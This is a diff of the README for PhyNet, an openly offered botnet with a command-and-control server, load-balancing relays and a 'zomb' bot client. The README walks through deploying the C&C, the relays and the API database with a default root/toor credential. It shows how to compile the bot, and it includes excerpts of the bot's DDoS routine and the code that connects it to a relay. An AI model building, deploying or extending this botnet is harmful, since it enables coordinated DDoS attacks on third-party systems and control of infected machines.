@@ -1,6 +1,6 @@
 # PhyNet
  phynet is a botnet coded in python and php, wich is using relays for balancing bots and uses only one cnc.  
- phynet is an old project in bad languages for a botnet and actually not working, you may want to uses oldest versions, you can consider this code as a POC of a easy balanced botnet
+ phynet is an old project in bad languages for a botnet and actually not working well, you may want to uses oldest versions, you can consider this code as a POC of a easy balanced botnet
 
 # CNC
 Def: "Command and Control" (C&C) servers are centralized machines that are able to send commands and receive outputs of machines part of a botnet. Anytime attackers who wish to launch a DDoS attack can send special commands to their botnet's C&C servers with instructions to perform an attack on a particular target, and any infected machines communicating with the contacted C&C server will comply by launching a coordinated attack.   
@@ -15,8 +15,7 @@ or just `make cnc` with the makefile
 
 The cnc password is stored in the sql database, the cnc uses the page [login.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/login.php) for login, like this we doesn't have to keep a raw text file with the password in it, moreover the password is a combo of sha512(sha256(password)) and is inserted with the following sql command: 
 ```sql
-INSERT INTO `users` (`id`, `username`, `password`) VALUES
-(1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
+INSERT INTO users (id, username, password) VALUES (1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
 ```
 here the default username is **root** and the default password is **toor**
 
@@ -31,34 +30,21 @@ or just `make relay` with the makefile
 for setup the [api](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2), you need a database:
 ## API Database:
 ```sql
-SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
-START TRANSACTION;
-SET time_zone = "+00:00";
+DROP TABLE IF EXISTS relays;
+CREATE TABLE relays (
+    relay_ip TEXT NOT NULL,
+    relay_bots INTEGER NOT NULL,
+    relay_swap_key TEXT NOT NULL
+);
 
-DROP TABLE IF EXISTS `gkeys`;
-CREATE TABLE IF NOT EXISTS `gkeys` (
-  `gkey` text COLLATE utf8_unicode_ci NOT NULL,
-  `ogkey` text COLLATE utf8_unicode_ci NOT NULL,
-  `relay` text COLLATE utf8_unicode_ci NOT NULL
-) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;
+DROP TABLE IF EXISTS users;
+CREATE TABLE users (
+    id SERIAL PRIMARY KEY,
+    username TEXT NOT NULL,
+    password TEXT NOT NULL
+);
 
-DROP TABLE IF EXISTS `relays`;
-CREATE TABLE IF NOT EXISTS `relays` (
-  `relay_ip` text COLLATE utf8_unicode_ci NOT NULL,
-  `relay_bots` int NOT NULL
-) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;
-
-DROP TABLE IF EXISTS `users`;
-CREATE TABLE IF NOT EXISTS `users` (
-  `id` int NOT NULL AUTO_INCREMENT,
-  `username` text COLLATE utf8_unicode_ci NOT NULL,
-  `password` text COLLATE utf8_unicode_ci NOT NULL,
-  PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;
-
-INSERT INTO `users` (`id`, `username`, `password`) VALUES
-(1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
-COMMIT;
+INSERT INTO users (id, username, password) VALUES (1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
 ```
 (the password encryption is sha512)   
 In php you can use this function for generate a password
@@ -78,23 +64,12 @@ function createAccount(string $usr, string $password): bool {
     return $result;
 }
 ```
-Next, you need an php server for copy the api file ([SERVER/api/v1](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2))  
-After you have to configure the database in the php script ([SERVER/api/v1/db_conn/db_connn.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/db/db_conn.php))  
-```php
-$sname = "localhost";
-$unmae = "root";
-$password = "";
-$db_name = "phybot";
-$conn = mysqli_connect($sname, $unmae, $password, $db_name);
-
-if (!$conn) {
-	echo json_encode("db_connection_failed", JSON_PRETTY_PRINT);
-}
-```
-You have to change your api url in:  
-> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py)) `API_URL: str = "http://localhost/phybot/api/v1"` (L28),  
-> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L42),  
-> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py)) `api_url="http://localhost/phybot/api/v1"` (L41)  
+Next, you will need to build and start the api server which in v3 is in golang so you doesn't need a php server anymore, just a simple `make api` will run it but before you will need to have golang installed [like This](https://go.dev/doc/install) and you will also need to have a postgresql server as main database (postgresql is an application which is running on a server, so you can buy dedicated postgresql servers on the cloud (AWS, OVH, etc) or you can run your own on your computer or your server [Like This](https://www.postgresql.org/download/) or [With Docker](https://www.docker.com/blog/how-to-use-the-postgres-docker-official-image/))  
+To connect your database with your api, you can go on [postgres.go](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v3/internal/databases/postgres.go#L13) and change lines 13, 14 and 15 with your config.
+Once your api is running with your database connected you'll have to change your api url (only the ip) in:  
+> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py#L44)) `API_URL: str = "http://127.0.0.1/v3"` (L44),  
+> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py#L52)) `API_URL: ClassVar[str] = "http://127.0.0.1:8052/v3"` (L52),  
+> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py#L41)) `API_URL: ClassVar[str] = "http://127.0.0.1:8052/v3"` (L41)  
 
 # ZOMB
 you may want to compile the bot with nuitka (create a fast executable file because the python code is transpiled to c and compiled)
@@ -102,9 +77,10 @@ but the simple command for running it is:
 ```batch
 python3 zomb.py
 ```
-and you can just build it with the command `make build-bot`
+you can just build it (with nuitka) with the command `make build-bot` or run it with `make bot`
 
 ## ZOMB DDOS Code: 
+here is a preview of the zomb ddos code for each mode, it's really basic but if you want to improve it, don't hesitate to contact me (my discord is in my profile)
 ```python
 def dos(
     s: sock,
@@ -149,36 +125,38 @@ def dos(
 ```
 ## The ZOMB Socket Connection
 ```python
-c2: sock = sock(AF_INET, SOCK_STREAM)
-c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+relay: sock = sock(AF_INET, SOCK_STREAM)
+relay.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
 
 while 1:
     try:
-        RELAY_ADDR: str = rget(f"{API_URL}/dispatch.php?urlkey={URL_KEY}", timeout=5000).text
+        RELAY_IP: str = rget(f"{API_URL}/dispatch?urlkey={URL_KEY}", timeout=5000).text
 
-        raddr.clear()
-        raddr.append(RELAY_ADDR)
+        relay_address.clear()
+        relay_address.append(RELAY_IP)
 
-        c2.connect((RELAY_ADDR, RELAY_PORT))
+        relay.connect((RELAY_IP, RELAY_PORT))
 
-        log((RELAY_ADDR, RELAY_PORT))
+        log((RELAY_IP, RELAY_PORT))
 
         while 1:
-            data: str = c2.recv(1024).decode()
+            data: str = relay.recv(1024).decode()
 
             if 'Username' in data:
-                c2.send('BOT'.encode())
+                relay.send('BOT'.encode())
                 log("send bot")
                 break
 
         while 1:
-            data: str = c2.recv(1024).decode()
+            data: str = relay.recv(1024).decode()
 
             if 'Password' in data:
-                c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
+                relay.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                 log("send bot string")
                 break
 
         break
-    except: sleep(240)
+
+    except:
+        sleep(240)
 ```
